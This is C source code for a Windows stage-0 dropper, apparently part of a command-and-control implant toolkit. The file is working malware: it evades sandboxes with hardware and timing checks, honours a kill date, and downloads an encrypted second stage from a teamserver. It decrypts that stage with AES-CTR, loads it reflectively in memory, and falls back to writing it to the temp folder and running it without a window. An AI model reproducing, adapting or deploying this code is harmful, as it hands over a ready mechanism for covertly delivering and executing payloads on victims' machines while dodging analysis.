/**
 * stager.c - Stage-0 dropper (C replacement for the deleted Rust stager)
 *
 * Fetches encrypted Stage-1 from teamserver, AES-CTR decrypts,
 * attempts reflective PE load, falls back to disk drop + CreateProcess.
 *
 * Compile: x86_64-w64-mingw32-gcc -Os -s -mwindows stager.c
 *          -lwinhttp -ladvapi32 -lbcrypt -Wl,--gc-sections
 *
 * Build-time -D flags (set by build_implant.py):
 *   STAGER_C2_URL, STAGER_STAGE_PATH, STAGER_USER_AGENT,
 *   STAGER_AES_KEY (hex), STAGER_AES_IV (hex),
 *   STAGER_KILL_DATE (unix ts, 0=none), STAGER_DELAY_MS
 */

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdio.h>
#include "../../include/cert_pin.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef STAGER_C2_URL
#define STAGER_C2_URL "https://127.0.0.1:443"
#endif
#ifndef STAGER_STAGE_PATH
#define STAGER_STAGE_PATH "/api/v1/stage"
#endif
#ifndef STAGER_USER_AGENT
#define STAGER_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif
#ifndef STAGER_AES_KEY
#define STAGER_AES_KEY "0000000000000000000000000000000000000000000000000000000000000000"
#endif
#if !defined(STAGER_AES_KEY_SET) || STAGER_AES_KEY_SET != 1
#error "STAGER_AES_KEY must be set by the build pipeline. Do not use default keys."
#endif
#ifndef STAGER_AES_IV
#define STAGER_AES_IV "00000000000000000000000000000000"
#endif
#ifndef STAGER_KILL_DATE
#define STAGER_KILL_DATE 0
#endif
#ifndef STAGER_DELAY_MS
#define STAGER_DELAY_MS 5000
#endif

/* ---- hex parse ---- */

static BYTE hex_nibble(char c) {
    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (BYTE)(c - 'A' + 10);
    return 0;
}

static void hex_to_bytes(const char *hex, BYTE *out, DWORD out_len) {
    for (DWORD i = 0; i < out_len; i++)
        out[i] = (hex_nibble(hex[i*2]) << 4) | hex_nibble(hex[i*2+1]);
}

/* ---- sandbox checks ---- */

static BOOL sandbox_check(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (ULONGLONG)2 * 1024 * 1024 * 1024) return TRUE;

    DWORD t1 = GetTickCount();
    Sleep(50);
    DWORD t2 = GetTickCount();
    if (t2 - t1 < 40) return TRUE;

    return FALSE;
}

/* ---- kill date ---- */

static BOOL is_expired(void) {
    DWORD kd = STAGER_KILL_DATE;
    if (kd == 0) return FALSE;
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER now;
    now.LowPart = ft.dwLowDateTime;
    now.HighPart = ft.dwHighDateTime;
    ULARGE_INTEGER kill;
    kill.QuadPart = ((ULONGLONG)kd * 10000000ULL) + 116444736000000000ULL;
    return now.QuadPart >= kill.QuadPart;
}

/* ---- AES-CTR decrypt via BCrypt ---- */

static BOOL aes_ctr_decrypt(const BYTE *ct, DWORD ct_len,
                            const BYTE *key32, const BYTE *iv16,
                            BYTE *pt) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ok = FALSE;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return FALSE;

    BYTE iv_copy[16];
    CopyMemory(iv_copy, iv16, 16);

    DWORD cbObj = 0, cbData = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj, sizeof(cbObj), &cbData, 0);

    BYTE *keyObj = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbObj);
    if (!keyObj) goto cleanup;

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, cbObj,
                                   (PUCHAR)key32, 32, 0) != 0)
        goto cleanup;

    LPCWSTR chain = BCRYPT_CHAIN_MODE_ECB;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)chain,
                      (ULONG)(wcslen(chain) + 1) * sizeof(WCHAR), 0);

    /* Manual CTR: encrypt counter blocks and XOR with ciphertext */
    BYTE counter[16], enc_block[16];
    CopyMemory(counter, iv16, 16);

    for (DWORD off = 0; off < ct_len; off += 16) {
        DWORD out_len = 0;
        if (BCryptEncrypt(hKey, counter, 16, NULL, NULL, 0,
                          enc_block, 16, &out_len, 0) != 0)
            goto cleanup;

        DWORD chunk = ct_len - off;
        if (chunk > 16) chunk = 16;
        for (DWORD j = 0; j < chunk; j++)
            pt[off + j] = ct[off + j] ^ enc_block[j];

        /* increment counter (big-endian) */
        for (int i = 15; i >= 0; i--) {
            if (++counter[i] != 0) break;
        }
    }
    ok = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (keyObj) HeapFree(GetProcessHeap(), 0, keyObj);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---- WinHTTP fetch ---- */

static BYTE *fetch_stage(DWORD *out_len) {
    *out_len = 0;

    wchar_t wUA[256], wUrl[512], wPath[512], wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, STAGER_USER_AGENT, -1, wUA, 256);
    MultiByteToWideChar(CP_UTF8, 0, STAGER_C2_URL, -1, wUrl, 512);
    MultiByteToWideChar(CP_UTF8, 0, STAGER_STAGE_PATH, -1, wPath, 512);

    URL_COMPONENTS uc;
    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = wHost;
    uc.dwHostNameLength = 256;
    if (!WinHttpCrackUrl(wUrl, 0, 0, &uc)) return NULL;

    HINTERNET hSess = WinHttpOpen(wUA, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return NULL;

    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hSess, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));

    HINTERNET hConn = WinHttpConnect(hSess, wHost, uc.nPort, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return NULL; }

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", wPath, NULL,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return NULL; }

    if (flags & WINHTTP_FLAG_SECURE) {
#ifdef CERT_PIN_HASH
        cert_pin_install_callback(hReq);
        cert_pin_apply_tls_flags(hReq);
#elif defined(LAB_NO_TLS_VERIFY)
        {
            DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
        }
#endif
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }

#ifdef CERT_PIN_HASH
    if ((flags & WINHTTP_FLAG_SECURE) && cert_pin_failed()) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }
#endif

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }

    DWORD cap = 1024 * 1024, total = 0;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return NULL; }

    DWORD rd = 0;
    while (WinHttpReadData(hReq, buf + total, cap - total, &rd)) {
        if (rd == 0) break;
        total += rd;
        if (total >= cap - 4096) {
            cap *= 2;
            if (cap > 64 * 1024 * 1024) break;
            BYTE *nb = (BYTE *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, cap);
            if (!nb) break;
            buf = nb;
        }
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);

    if (total == 0) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    *out_len = total;
    return buf;
}

/* ---- Reflective PE loader ---- */

static BOOL reflective_load(BYTE *pe, DWORD pe_len) {
    if (pe_len < sizeof(IMAGE_DOS_HEADER)) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_Magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > pe_len) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;

    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return FALSE;

    CopyMemory(base, pe, nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > pe_len) {
            VirtualFree(base, 0, MEM_RELEASE);
            return FALSE;
        }
        CopyMemory(base + sec[i].VirtualAddress,
                    pe + sec[i].PointerToRawData,
                    sec[i].SizeOfRawData);
    }

    /* Relocations */
    LONGLONG delta = (LONGLONG)(base - (BYTE *)nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        DWORD reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_sz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (reloc_rva && reloc_sz) {
            BYTE *reloc = base + reloc_rva;
            DWORD off = 0;
            while (off < reloc_sz) {
                PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(reloc + off);
                if (block->SizeOfBlock == 0) break;
                DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < count; j++) {
                    int type = entries[j] >> 12;
                    DWORD rva = block->VirtualAddress + (entries[j] & 0xFFF);
                    if (type == IMAGE_REL_BASED_DIR64 && rva + 8 <= image_size) {
                        *(LONGLONG *)(base + rva) += delta;
                    }
                }
                off += block->SizeOfBlock;
            }
        }
    }

    /* Imports */
    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (imp_rva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + imp_rva);
        while (imp->Name) {
            char *dll_name = (char *)(base + imp->Name);
            HMODULE hDll = LoadLibraryA(dll_name);
            if (!hDll) { VirtualFree(base, 0, MEM_RELEASE); return FALSE; }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
            PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);

            while (thunk->u1.AddressOfData) {
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    iat->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                    iat->u1.Function = (ULONGLONG)GetProcAddress(hDll, ibn->Name);
                }
                thunk++;
                iat++;
            }
            imp++;
        }
    }

    /* Section protections */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READONLY;
        DWORD ch = sec[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;

        DWORD old;
        VirtualProtect(base + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
    }

    /* Call entry point — EXE vs DLL */
    DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
    void *entry = (void *)(base + entry_rva);

    if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
        ((DllMainFunc)entry)((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef int (*ExeEntryFunc)(void);
        ((ExeEntryFunc)entry)();
    }
    return TRUE;
}

/* ---- Fallback: drop to disk and run ---- */

static BOOL disk_execute(BYTE *pe, DWORD pe_len) {
    char tmp[MAX_PATH], path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);

    DWORD tick = GetTickCount();
    _snprintf(path, sizeof(path), "%s%08lx.exe", tmp, tick);

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written = 0;
    WriteFile(hFile, pe, pe_len, &written, NULL);
    CloseHandle(hFile);

    if (written != pe_len) { DeleteFileA(path); return FALSE; }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessA(path, NULL, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return ok;
}

/* ---- Entry ---- */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nShow;

    if (sandbox_check()) return 0;
    if (is_expired()) return 0;

    Sleep(STAGER_DELAY_MS);

    /* Verify sleep was not accelerated */
    DWORD t1 = GetTickCount();
    Sleep(100);
    if (GetTickCount() - t1 < 80) return 0;

    /* Fetch encrypted stage */
    DWORD enc_len = 0;
    BYTE *enc = fetch_stage(&enc_len);
    if (!enc || enc_len == 0) return 1;

    /* Parse AES key/IV from compile-time hex strings */
    BYTE key[32], iv[16];
    hex_to_bytes(STAGER_AES_KEY, key, 32);
    hex_to_bytes(STAGER_AES_IV, iv, 16);

    /* Decrypt */
    BYTE *pt = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, enc_len);
    if (!pt) { HeapFree(GetProcessHeap(), 0, enc); return 1; }

    if (!aes_ctr_decrypt(enc, enc_len, key, iv, pt)) {
        HeapFree(GetProcessHeap(), 0, enc);
        HeapFree(GetProcessHeap(), 0, pt);
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, enc);

    /* Zero key material */
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(iv, sizeof(iv));

    /* Reflective load is primary; disk drop is fallback only */
    if (!reflective_load(pt, enc_len)) {
        if (!disk_execute(pt, enc_len))
            return 1;
    }

    SecureZeroMemory(pt, enc_len);
    HeapFree(GetProcessHeap(), 0, pt);
    return 0;
}
